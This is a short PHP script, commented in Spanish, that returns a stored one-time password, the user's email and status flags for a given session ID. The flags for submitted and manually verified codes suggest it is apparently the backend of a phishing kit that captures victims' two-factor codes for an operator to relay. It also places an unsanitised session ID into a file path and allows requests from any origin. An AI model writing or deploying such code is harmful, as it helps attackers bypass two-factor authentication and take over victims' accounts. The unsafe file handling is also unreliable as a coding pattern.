<?php
// Este script devuelve el OTP de una sesión específica

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'message' => 'Método no permitido']);
    exit();
}

// Obtener el ID de sesión
$data = json_decode(file_get_contents('php://input'), true);
$session_id = $data['session_id'] ?? '';

if (empty($session_id)) {
    echo json_encode(['success' => false, 'message' => 'ID de sesión no proporcionado']);
    exit();
}

// Verificar si existe el archivo de sesión
$session_file = __DIR__ . "/sessions/{$session_id}.json";

if (!file_exists($session_file)) {
    echo json_encode(['success' => false, 'message' => 'Sesión no encontrada']);
    exit();
}

// Leer el archivo de sesión
$session_data = json_decode(file_get_contents($session_file), true);

// Verificar si el OTP ha sido enviado y no ha sido verificado manualmente
$otp_submitted = isset($session_data['otp_submitted']) && $session_data['otp_submitted'] === true;
$manually_verified = isset($session_data['manually_verified']) && $session_data['manually_verified'] === true;

// Solo mostrar el código OTP si ha sido enviado y no ha sido verificado manualmente
$otp_code = null;
if ($otp_submitted && !$manually_verified) {
    $otp_code = $session_data['otp_code'] ?? null;
}

// Devolver la información del OTP
echo json_encode([
    'success' => true,
    'session_id' => $session_id,
    'otp_requested' => $session_data['otp_requested'] ?? false,
    'otp_submitted' => $otp_submitted,
    'otp_code' => $otp_code,
    'otp_verified' => $session_data['otp_verified'] ?? false,
    'manually_verified' => $manually_verified,
    'email' => $session_data['email'] ?? '',
    'timestamp' => $session_data['timestamp'] ?? '',
    'created_at' => $session_data['created_at'] ?? '',
    'updated_at' => $session_data['updated_at'] ?? ''
]);
?>